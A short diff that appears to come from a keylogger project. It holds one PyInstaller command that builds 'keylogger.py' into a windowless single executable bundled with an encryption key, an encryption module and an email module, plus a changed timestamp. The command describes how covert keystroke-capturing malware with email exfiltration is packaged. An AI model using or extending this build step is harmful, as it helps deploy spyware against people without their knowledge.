@@ -1,2 +1,2 @@
 pyinstaller --onefile --noconsole --add-data "encryption_key.bin;." --add-data "encryption.py;." --add-data "emailFunctionality.py;." keylogger.py
-     17:39:43 30-10-2024
+     15:13:54 31-10-2024
